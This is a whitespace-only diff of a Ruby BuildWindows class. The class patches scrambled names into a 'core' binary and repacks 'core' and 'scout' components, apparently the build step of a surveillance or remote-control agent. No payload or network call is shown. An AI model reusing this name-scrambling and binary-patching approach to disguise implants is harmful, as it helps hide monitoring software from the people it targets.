@@ -74,7 +74,6 @@ class BuildWindows < Build
         dir = scramble_name(core[0..7], 7)
         reg = '*' + scramble_name(dir, 1)[1..-1]
         content.binary_patch 'IaspdPDuFMfnm_apggLLL712j', reg.ljust(25, "\x00")
-
       rescue
         raise "#{marker} marker not found"
       end
@@ -211,6 +210,7 @@ class BuildWindows < Build
       core_content = z.file.open('core', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
+
       core_content = z.file.open('scout', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('scout'), "wb") {|f| f.write core_content}
@@ -219,6 +219,7 @@ class BuildWindows < Build
     # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
     CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
     FileUtils.rm_rf Config.instance.temp('core')
+
     CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('scout')}"
     FileUtils.rm_rf Config.instance.temp('scout')
   end
